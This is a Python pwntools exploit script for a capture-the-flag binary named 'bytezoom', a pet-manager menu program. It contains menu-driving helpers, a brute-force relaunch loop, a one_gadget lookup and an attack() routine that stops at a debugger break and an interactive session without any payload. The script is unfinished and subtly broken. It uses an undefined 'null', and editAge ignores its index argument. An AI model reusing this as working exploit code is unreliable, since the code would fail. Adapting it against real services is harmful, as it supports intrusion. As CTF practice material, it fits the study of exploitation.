# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './bytezoom'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice',num)

def add(  idx , name , age , type = 1):
    cmd(1)
    if(type == 1):
        sla('cat or dog?','cat')
    else:
        sla('cat or dog?','dog')
    sla('index:' , idx)
    sla('name:' , name)
    sla('age' , age)

def show(idx , type = 1):
    cmd(2)
    if(type == 1):
        sla('cat or dog?','cat')
    else:
        sla('cat or dog?','dog')
    sla('index:' , idx)

def select(idx , type = 1):
    cmd(1)
    if(type == 1):
        sla('cat or dog?','cat')
    else:
        sla('cat or dog?','dog')
    sla('index:' , idx)

def editAge(idx , num ,type = 1):
    cmd(2)
    if(type == 1):
        sla('cat or dog?','cat')
    else:
        sla('cat or dog?','dog')
    sla('want to add',num)
    # cmd(4)

def editName(idx , name ,type = 1):
    cmd(3)
    select( idx , type )
    cmd(3)
    if(type == 1):
        sla('cat or dog?','cat')
    else:
        sla('cat or dog?','dog')
    sla('new name:',name)
    cmd(4)

pointer = 0x122E0
# one_gad = one_gadget(libc.path)

def attack():
    add(0, 'a'*0x8 , 0x99 ,1)
    add(1, 'b'*0x8 , 0x77 ,1)
    add(2, 'c'*0x8 , 0x55 ,2)
    # editAge( 0 ,20  )
    cmd(3)
    select( 2,2 )
    select( 0,1 )

    # dbg()
    editAge(0 , 0x10 , 2)

    dbg()


    # sl('echo shell')
    # ru('shell')
    p.interactive()

attack()

'''
@File    :   bytezoom.py
@Time    :   2021/10/16 10:10:06
@Author  :   Niyah 
'''